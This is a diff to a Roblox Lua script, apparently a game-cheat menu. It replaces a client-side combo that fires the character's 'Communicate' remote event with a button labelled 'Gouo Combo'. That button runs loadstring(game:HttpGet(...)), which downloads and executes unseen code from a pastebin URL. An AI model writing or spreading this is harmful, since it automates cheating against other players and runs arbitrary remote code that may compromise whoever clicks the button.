@@ -53,43 +53,19 @@ game:GetService("UserInputService").InputChanged:Connect(function(input)
     end
 end)
 
--- Create Combo 1 Button
-local combo1Button = Instance.new("TextButton")
-combo1Button.Size = UDim2.new(0, 180, 0, 50)
-combo1Button.Position = UDim2.new(0, 10, 0, 10)
-combo1Button.Text = "Execute Combo 1"
-combo1Button.Parent = menuFrame
+-- Create Gouo Combo Button inside the menu
+local gouoComboButton = Instance.new("TextButton")
+gouoComboButton.Size = UDim2.new(0, 180, 0, 50)
+gouoComboButton.Position = UDim2.new(0, 10, 0, 10) -- Positioned at the top of the menu
+gouoComboButton.Text = "Gouo Combo"
+gouoComboButton.Parent = menuFrame
 
--- Function to Execute Combo 1
-local function executeCombo1()
-    for i = 1, 3 do
-        local punchArgs = {
-            [1] = {
-                ["Goal"] = "LeftClick",
-                ["Mobile"] = true
-            }
-        }
-        print("Executing Punch " .. i)
-        game:GetService("Players").LocalPlayer.Character.Communicate:FireServer(unpack(punchArgs))
-        
-        local releaseArgs = {
-            [1] = {
-                ["Goal"] = "LeftClickRelease",
-                ["Mobile"] = true
-            }
-        }
-        print("Executing Release " .. i)
-        game:GetService("Players").LocalPlayer.Character.Communicate:FireServer(unpack(releaseArgs))
-
-        if i == 1 then
-            wait(0.2) -- Delay before the second punch
-        elseif i == 2 then
-            wait(0.4) -- Delay before the third punch
-        end
-    end
+-- Function to Execute Gouo Combo
+local function executeGouoCombo()
+    loadstring(game:HttpGet("https://pastebin.com/raw/XcVbJ6PT"))()
 end
 
-combo1Button.MouseButton1Click:Connect(executeCombo1)
+gouoComboButton.MouseButton1Click:Connect(executeGouoCombo)
 
 -- Toggle Menu Visibility
 local menuVisible = false
